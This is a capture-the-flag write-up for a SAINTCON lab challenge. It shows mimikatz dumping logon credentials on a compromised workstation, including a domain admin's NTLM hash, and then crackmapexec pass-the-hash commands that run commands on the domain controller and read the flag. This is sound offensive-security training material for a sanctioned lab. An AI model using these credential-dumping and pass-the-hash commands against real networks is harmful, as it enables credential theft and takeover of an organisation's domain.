# DC

## Challenge Description

This Category of Challenge is presented by The Keep Community at SAINTCON.

Have you ever wanted to come to a conference, hack a machine, and walk away feeling like you own the world? Yeah, you can do that here.

If you get stuck or have any questions, don't hesitate to visit The Keep Community for help or guidance!

========================================

Please Visit the HACKERS CHALLENGE BOOTH to spinup an environment for you!

This environment will be good for 3 hours.

(due to monetary costs, we won't keep it running longer, but can spin you up a new environement when you need it)

========================================

Welcome to the Keep!

You have been tasked with running a pentest on this client's network.

They have placed a file flag.txt on the desktop of all the important users in the network. This will allow them to see how far you have gone.

## Solution

Last we were on the admin account of **WS02**. We have developed some techniques
to get into these machines. Let's start from the top and try it again here. 

Let's put `mimikatz` on **WS02** and see what happens:

```cmd
$ mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\tmp\mimikatz_output.txt
...
...
Authentication Id : 0 ; 327706 (00000000:0005001a)
Session           : RemoteInteractive from 3
User Name         : zonifer
Domain            : HC
Logon Server      : DC
Logon Time        : 10/27/2023 4:47:59 AM
SID               : S-1-5-21-636138077-4214483599-707087073-1114
        msv :
         [00000003] Primary
         * Username : zonifer
         * Domain   : HC
         * NTLM     : 30495291d31d1aaa33739e374f48ee21
         * SHA1     : 6097e27d82087fdf2f8a8d399a9cbc6cdbd27125
         * DPAPI    : cc5fc7bc2f4f0e4a781cc305758ffeb4
        tspkg :
        wdigest :
         * Username : zonifer
         * Domain   : HC
         * Password : (null)
        kerberos :
         * Username : zonifer
         * Domain   : HC.LOCAL
         * Password : (null)
        ssp :
        credman :
...
...
```

Oh _zonifer_, I remember you from the user enumeration in the first challenge. I
knew we were going to be friends someday:

```json
...
...
 "cn": [
        "Domain Admins"
    ],
    "description": [
        "Designated administrators of the domain"
    ],
    "distinguishedName": [
        "CN=Domain Admins,CN=Users,DC=hc,DC=local"
    ],
    "member": [
        "CN=zonifer,CN=Users,DC=hc,DC=local",
        "CN=Administrator,CN=Users,DC=hc,DC=local"
    ],
    ...
    ...
...
...
```

I also like that zonifer is a domain admin... 

Let's go back to our `crackmapexec` tool that worked last time:

```bash
crackmapexec smb DC/32 -u zonifer -d HC -H 30495291d31d1aaa33739e374f48ee21 -x dir
```

And success!

Now we can read the flag:

```bash
crackmapexec smb DC/32 -u zonifer -d HC -H 30495291d31d1aaa33739e374f48ee21 -x type C:\\Users\\zonifer\\Desktop\\flag.txt
```


